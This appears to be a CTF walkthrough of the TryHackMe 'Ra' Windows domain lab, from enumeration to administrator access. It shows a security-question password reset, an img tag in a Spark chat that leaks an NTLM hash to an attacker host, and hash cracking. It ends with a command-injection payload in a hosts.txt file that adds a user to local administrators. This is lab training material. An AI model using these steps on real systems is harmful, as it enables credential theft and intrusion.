---
tags:
  - THM
  - Windows
  - Hard
  - AD
  - Info-Disclosure
  - CVE
  - Responder
  - Cracking
  - Schtasks
  - Cmd-Injection
---
# Information

- Machine: [Ra](https://tryhackme.com/room/ra)
- Target: `10.65.133.228`
- Attacker: `192.168.131.62`

# Enumeration

## Ports

Scanned all TCP ports:

```console
$ sudo nmap -p- --open -sS -Pn -n 10.65.133.228

PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5229/tcp  open  jaxflow
5276/tcp  open  unknown
7777/tcp  open  cbt
9090/tcp  open  zeus-admin
9389/tcp  open  adws
49667/tcp open  unknown
49668/tcp open  unknown
49708/tcp open  unknown
```

Service version detection for open ports:

```console
$ nmap -p53,80,88,135,139,443,445,636,3269,3389,5262,5270,5275,7443,7777,9090,9091,49670 -sV -sC 10.65.133.228

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
| dns-nsid: 
|_  NSID:  ()
80/tcp    open  http              Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Windcorp.
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-11-16 22:39:12Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
443/tcp   open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|   Negotiate
|_  NTLM
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2026-11-16T22:40:42+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Windows Admin Center
| Subject Alternative Name: DNS:WIN-2FAA40QQ70B
| Not valid before: 2020-04-30T14:41:03
|_Not valid after:  2020-06-30T14:41:02
| http-ntlm-info: 
|   Target_Name: WINDCORP
|   NetBIOS_Domain_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
|_  Product_Version: 10.0.17763
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
445/tcp   open  microsoft-ds?
636/tcp   open  ldapssl?
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=Fire.windcorp.thm
| Not valid before: 2026-11-15T22:36:10
|_Not valid after:  2027-05-17T22:36:10
|_ssl-date: 2026-11-16T22:40:42+00:00; 0s from scanner time.
5262/tcp  open  jabber
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     auth_mechanisms: 
|     features: 
|     capabilities: 
|     stream_id: 73jnnax59a
|     xmpp: 
|       version: 1.0
|_    compression_methods: 
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5270/tcp  open  ssl/xmpp          Wildfire XMPP Client
|_ssl-date: 2026-11-16T22:40:42+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
5275/tcp  open  unknown
7443/tcp  open  ssl/http          Jetty 9.4.18.v20190429
|_http-title: Openfire HTTP Binding Service
|_http-server-header: Jetty(9.4.18.v20190429)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
|_ssl-date: 2026-11-16T22:40:42+00:00; 0s from scanner time.
7777/tcp  open  socks5            (No authentication; connection failed)
| socks-auth-info: 
|_  No authentication
9090/tcp  open  http              Jetty
|_http-title: Site doesn't have a title (text/html).
9091/tcp  open  ssl/http          Jetty
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
|_http-title: Site doesn't have a title (text/html).
|_ssl-date: 2026-11-16T22:40:42+00:00; 0s from scanner time.
49670/tcp open  msrpc             Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5262-TCP:V=7.993%I=7%D=11/16%Time=6AFB8627%P=x86_64-pc-linux-gnu%r(
SF:RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org
SF:/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-stre
SF:ams\"/></stream:error></stream:stream>");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-11-16T22:40:26
|_  start_date: N/A
```

Append to the `/etc/hosts` file:

```text
10.65.133.228 windcorp.thm fire.windcorp.thm
```

## Web

The web page had a "Reset password" button which showed a pop-up window at `/reset.asp` containing a form.

The prompt asked for a **username** and an answer to a **chosen security question** among:

- "What is your mothers maiden name?"
- "What was your first grade teachers name?"
- "What is/was your favorite pets name?"
- "What make was your first car?"

By looking at the source code, there is a list of **potential valid users**:

```html
<li><img src="http://fire.windcorp.thm:9090/plugins/presence/status?jid=organicfish718@fire.windcorp.thm"> <a href="xmpp:organicfish718@fire.windcorp.thm">Antonietta Vidal</a></li>
<li><img src="http://fire.windcorp.thm:9090/plugins/presence/status?jid=organicwolf509@fire.windcorp.thm"> <a href="xmpp:organicwolf509@fire.windcorp.thm">Britney Palmer</a></li>
<li><img src="http://fire.windcorp.thm:9090/plugins/presence/status?jid=tinywolf424@fire.windcorp.thm"> <a href="xmpp:tinywolf424@fire.windcorp.thm">Brittany Cruz</a></li>
<li><img src="http://fire.windcorp.thm:9090/plugins/presence/status?jid=angrybird253@fire.windcorp.thm"> <a href="xmpp:angrybird253@fire.windcorp.thm">Carla Meyer</a></li>
<li><img src="http://fire.windcorp.thm:9090/plugins/presence/status?jid=buse@fire.windcorp.thm"> <a href="xmpp:buse@fire.windcorp.thm">Buse Candan</a></li>
<li><img src="http://fire.windcorp.thm:9090/plugins/presence/status?jid=Edeltraut@fire.windcorp.thm"><a href="xmpp:Edeltraut@fire.windcorp.thm"> Edeltraut Daub</a></li>
<li><img src="http://fire.windcorp.thm:9090/plugins/presence/status?jid=Edward@fire.windcorp.thm"><a href="xmpp:Edward@fire.windcorp.thm"> Edward Lewis</a></li>
<li><img src="http://fire.windcorp.thm:9090/plugins/presence/status?jid=Emile@fire.windcorp.thm"><a href="xmpp:Emile@fire.windcorp.thm"> Emile Lavoie</a></li>
<li><img src="http://fire.windcorp.thm:9090/plugins/presence/status?jid=tinygoose102@fire.windcorp.thm"><a href="xmpp:tinygoose102@fire.windcorp.thm"> Emile Henry</a></li>
<li><img src="http://fire.windcorp.thm:9090/plugins/presence/status?jid=brownostrich284@fire.windcorp.thm"><a href="xmpp:brownostrich284@fire.windcorp.thm"> Emily Anderson</a></li>
<li><img src="http://fire.windcorp.thm:9090/plugins/presence/status?jid=sadswan869@fire.windcorp.thm"><a href="xmpp:sadswan869@fire.windcorp.thm"> Hemmo Boschma</a></li>
<li><img src="http://fire.windcorp.thm:9090/plugins/presence/status?jid=goldencat416@fire.windcorp.thm"><a href="xmpp:sadswan869@fire.windcorp.thm"> Isabella Hughes</a></li>
<li><img src="http://fire.windcorp.thm:9090/plugins/presence/status?jid=whiteleopard529@fire.windcorp.thm"><a href="xmpp:whiteleopard529@fire.windcorp.thm"> Isra Saur</a></li>
<li><img src="http://fire.windcorp.thm:9090/plugins/presence/status?jid=happymeercat399@fire.windcorp.thm"><a href="xmpp:happymeercat399@fire.windcorp.thm"> Jackson Vasquez</a></li>
<li><img src="http://fire.windcorp.thm:9090/plugins/presence/status?jid=orangegorilla428@fire.windcorp.thm"><a href="xmpp:orangegorilla428@fire.windcorp.thm"> Jaqueline Dittmer</a></li>
```

And the images reveal a pet name "Sparky" for "Lily Levesque":

```html
<div class="col-lg-4">
	<div class="testimonial-item mx-auto mb-5 mb-lg-0">
		<img class="img-fluid rounded-circle mb-3" src="img/lilyleAndSparky.jpg" alt="">
		<h5>Lily Levesque</h5>
		<p class="font-weight-light mb-0">"I love being able to bring my best friend to work with me!"</p>
	</div>
</div>
```

After trying to submit the form with username `lilyle` and selecting `Sparky` as her favorite pet's name, we successfully reset her password:

```html
<h4 class='display-3'>Your password has been reset to: <b>ChangeMe#1234</b><br></h4>Remember to change it after logging in!
```


## SMB

After the password reset, now we can authenticate to SMB using those credentials:

```console
$ nxc smb 10.65.133.228 -u 'lilyle' -p 'ChangeMe#1234'

SMB         10.65.133.228   445    FIRE             [*] Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.65.133.228   445    FIRE             [+] windcorp.thm\lilyle:ChangeMe#1234
```

So we can list shares:

```console
$ nxc smb 10.65.133.228 -u 'lilyle' -p 'ChangeMe#1234' --shares

SMB         10.65.133.228   445    FIRE             [*] Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.65.133.228   445    FIRE             [+] windcorp.thm\lilyle:ChangeMe#1234 
SMB         10.65.133.228   445    FIRE             [*] Enumerated shares
SMB         10.65.133.228   445    FIRE             Share           Permissions     Remark
SMB         10.65.133.228   445    FIRE             -----           -----------     ------
SMB         10.65.133.228   445    FIRE             ADMIN$                          Remote Admin
SMB         10.65.133.228   445    FIRE             C$                              Default share
SMB         10.65.133.228   445    FIRE             IPC$            READ            Remote IPC
SMB         10.65.133.228   445    FIRE             NETLOGON        READ            Logon server share 
SMB         10.65.133.228   445    FIRE             Shared          READ            
SMB         10.65.133.228   445    FIRE             SYSVOL          READ            Logon server share 
SMB         10.65.133.228   445    FIRE             Users           READ
```

And we can get the **Spark Software** that is likely running somewhere:

```console
$ smbclient -U 'lilyle%ChangeMe#1234' //10.65.133.228/Shared

smb: \> ls
  .                                   D        0  Fri May 29 19:45:42 2020
  ..                                  D        0  Fri May 29 19:45:42 2020
  Flag 1.txt                          A       45  Fri May  1 10:32:36 2020
  spark_2_8_3.deb                     A 29526628  Fri May 29 19:45:01 2020
  spark_2_8_3.dmg                     A 99555201  Sun May  3 06:06:58 2020
  spark_2_8_3.exe                     A 78765568  Sun May  3 06:05:56 2020
  spark_2_8_3.tar.gz                  A 123216290  Sun May  3 06:07:24 2020

smb: \> mget *
```

Read the **first flag**:

```console
$ cat 'Flag 1.txt'
```

# Exploitation

By doing some research, found that *Ignite Realtime Spark 2.8.3* is vulnerable to [CVE-2020-12772](https://nvd.nist.gov/vuln/detail/cve-2020-12772) where NTLM hashes can be leaked.

Install the software on Kali Linux:

```console
$ sudo dpkg -i --ignore-depends=openjdk-8-jre,oracle-java8-jre spark_2_8_3.deb
```

Fix launch script `/usr/bin/spark` for JDK compatibility:

```bash
java \
--add-opens java.base/java.net=ALL-UNNAMED \
--add-opens java.base/java.lang=ALL-UNNAMED \
--add-opens java.base/java.util=ALL-UNNAMED \
-Dappdir=${wd} \
${javalibrarypath} \
-cp ${classpath} \
${mainclass}
```

Then, launch `spark` and log in with:

- Username: `lilyle`
- Password: `ChangeMe#1234`
- Domain: `windcorp.thm`

The login failed, so enable these advanced options and try again:

- "Accept all certificates (self-signed/expired/not trusted)"
- "Disable certificate hostname verification (not recommended)"

Start capturing NTLM hashes:

```console
$ sudo responder -I tun0
```

From the **username list**, "Buse Candan" is the only one with green icon, I guess she is online. So, we start a chat with `buse@fire.windcorp.thm` and send the next image:

```html
<img src="http://192.168.131.62/a.png">
```

Save the NTLM hash at `buse.hash`:

```text
buse::WINDCORP:c5d1b229a855f65d:CF982F0BCE922A7A78CD9C83BD18BDD6:0101000000000000EF24A2912B76DD01FFDA0482421BA4C90000000002000800460036005500320001001E00570049004E002D005A004D0047005000460031003200580059004B0051000400140046003600550032002E004C004F00430041004C0003003400570049004E002D005A004D0047005000460031003200580059004B0051002E0046003600550032002E004C004F00430041004C000500140046003600550032002E004C004F00430041004C000800300030000000000000000100000000200000E9D2D4E512D99B9A281DDAEAF156F2202C0C1216421E07CC47E46B2641EE46BA0A00100000000000000000000000000000000000090000000000000000000000
```

Crack the **password** for `buse`:

```console
$ hashcat -a 0 -m 5600 buse.hash /usr/share/wordlists/rockyou.txt
...
BUSE::WINDCORP:c5d1b229a855f65d:cf982f0bce922a7a78cd9c83bd18bdd6:0101000000000000ef24a2912b76dd01ffda0482421ba4c90000000002000800460036005500320001001e00570049004e002d005a004d0047005000460031003200580059004b0051000400140046003600550032002e004c004f00430041004c0003003400570049004e002d005a004d0047005000460031003200580059004b0051002e0046003600550032002e004c004f00430041004c000500140046003600550032002e004c004f00430041004c000800300030000000000000000100000000200000e9d2d4e512d99b9a281ddaeaf156f2202c0c1216421e07cc47e46b2641ee46ba0a00100000000000000000000000000000000000090000000000000000000000:uzunLM+3131
...
```

The credentials are valid for *Windows Remote Administration (WinRM)*:

```console
$ nxc winrm 10.65.133.228 -u 'buse' -p 'uzunLM+3131'

WINRM       10.65.133.228   5985   FIRE             [*] Windows 10 / Server 2019 Build 17763 (name:FIRE) (domain:windcorp.thm) 
WINRM       10.65.133.228   5985   FIRE             [+] windcorp.thm\buse:uzunLM+3131 (Pwn3d!)
```

Connect via WinRM:

```console
$ evil-winrm-py -i 10.65.133.228 -u 'buse' -p 'uzunLM+3131'
```

Get the **second flag**:

```console
PS> type "C:\Users\Buse\Desktop\Flag 2.txt"
```

# Post-Exploitation

The user `buse` belongs to the `Account Operators` group:

```console
PS> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes                                        
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                   Alias            S-1-5-32-548                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
WINDCORP\IT                                 Group            S-1-5-21-555431066-3599073733-176599750-5865 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

Found a `checkservers.ps1` script which is probably being run between time intervals:

```console
PS> ls C:\scripts\

    Directory: C:\scripts


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-a----         5/3/2020   5:53 AM           4119 checkservers.ps1                                                       
-a----       11/16/2026   5:33 PM             31 log.txt


PS> type C:\scripts\log.txt
Last run: 11/16/2026 17:39:51
```

Get the contents for `checkservers.ps1`:

```powershell
# reset the lists of hosts prior to looping 
$OutageHosts = $Null 
# specify the time you want email notifications resent for hosts that are down 
$EmailTimeOut = 30 
# specify the time you want to cycle through your host lists. 
$SleepTimeOut = 45 
# specify the maximum hosts that can be down before the script is aborted 
$MaxOutageCount = 10 
# specify who gets notified 
$notificationto = "brittanycr@windcorp.thm" 
# specify where the notifications come from 
$notificationfrom = "admin@windcorp.thm" 
# specify the SMTP server 
$smtpserver = "relay.windcorp.thm" 
 
# start looping here 
Do{ 
$available = $Null 
$notavailable = $Null 
Write-Host (Get-Date) 
 
# Read the File with the Hosts every cycle, this way to can add/remove hosts 
# from the list without touching the script/scheduled task,  
# also hash/comment (#) out any hosts that are going for maintenance or are down. 
get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match "#")} |   
ForEach-Object { 
    $p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue"
    Invoke-Expression $p 
if($p) 
    { 
     # if the Host is available then just write it to the screen 
     write-host "Available host ---> "$_ -BackgroundColor Green -ForegroundColor White 
     [Array]$available += $_ 
    } 
else 
    { 
     # If the host is unavailable, give a warning to screen 
     write-host "Unavailable host ------------> "$_ -BackgroundColor Magenta -ForegroundColor White 
     $p = Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue 
     if(!($p)) 
       { 
        # If the host is still unavailable for 4 full pings, write error and send email 
        write-host "Unavailable host ------------> "$_ -BackgroundColor Red -ForegroundColor White 
        [Array]$notavailable += $_ 
 
        if ($OutageHosts -ne $Null) 
            { 
                if (!$OutageHosts.ContainsKey($_)) 
                { 
                 # First time down add to the list and send email 
                 Write-Host "$_ Is not in the OutageHosts list, first time down" 
                 $OutageHosts.Add($_,(get-date)) 
                 $Now = Get-date 
                 $Body = "$_ has not responded for 5 pings at $Now" 
                 Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom ` 
                  -Subject "Host $_ is down" -SmtpServer $smtpserver 
                } 
                else 
                { 
                    # If the host is in the list do nothing for 1 hour and then remove from the list. 
                    Write-Host "$_ Is in the OutageHosts list" 
                    if (((Get-Date) - $OutageHosts.Item($_)).TotalMinutes -gt $EmailTimeOut) 
                    {$OutageHosts.Remove($_)} 
                } 
            } 
        else 
            { 
                # First time down create the list and send email 
                Write-Host "Adding $_ to OutageHosts." 
                $OutageHosts = @{$_=(get-date)} 
                $Body = "$_ has not responded for 5 pings at $Now"  
                Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom ` 
                 -Subject "Host $_ is down" -SmtpServer $smtpserver 
            }  
       } 
    } 
} 
# Report to screen the details 
$log = "Last run: $(Get-Date)"
write-host $log
Set-Content -Path C:\scripts\log.txt -Value $log
Write-Host "Available count:"$available.count 
Write-Host "Not available count:"$notavailable.count 
Write-Host "Not available hosts:" 
$OutageHosts 
Write-Host "" 
Write-Host "Sleeping $SleepTimeOut seconds" 
sleep $SleepTimeOut 
if ($OutageHosts.Count -gt $MaxOutageCount) 
{ 
    # If there are more than a certain number of host down in an hour abort the script. 
    $Exit = $True 
    $body = $OutageHosts | Out-String 
    Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom ` 
     -Subject "More than $MaxOutageCount Hosts down, monitoring aborted" -SmtpServer $smtpServer 
} 
} 
while ($Exit -ne $True)
```

The script is likely being ran by `admin@windcorp.thm` and follows the next workflow:

1. Retrieves a host from a line at `C:\Users\brittanycr\hosts.txt`.
2. Crafts a `Test-Connection` command.
3. Executes it with `Invoke-Expression`.
4. Repeats this process (1-3) with all hosts.

Change the **password** for `brittanycr` by abusing the `Account Operators` group:

```console
PS> net user brittanycr 'pass123!' /domain
The command completed successfully.
```

Create a `hosts.txt` file which will inject a **custom command** to become an **administrator**:

```text
google.com; net localgroup administrators buse /add; a
```

Upload the `hosts.txt` file:

```console
$ smbclient -U 'brittanycr%pass123!' //10.65.133.228/Users

smb: \> cd brittanycr

smb: \brittanycr\> put hosts.txt
putting file hosts.txt as \brittanycr\hosts.txt (0.1 kB/s) (average 0.1 kB/s)
```

Wait some time and check administrator privileges:

```console
$ nxc smb 10.65.133.228 -u 'buse' -p 'uzunLM+3131'

SMB         10.65.133.228   445    FIRE             [*] Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.65.133.228   445    FIRE             [+] windcorp.thm\buse:uzunLM+3131 (Pwn3d!)
```

Re-connect again:

```console
$ evil-winrm-py -i 10.65.133.228 -u 'buse' -p 'uzunLM+3131'
```

Get the **third flag**:

```console
PS> type C:\Users\Administrator\Desktop\Flag3.txt
```
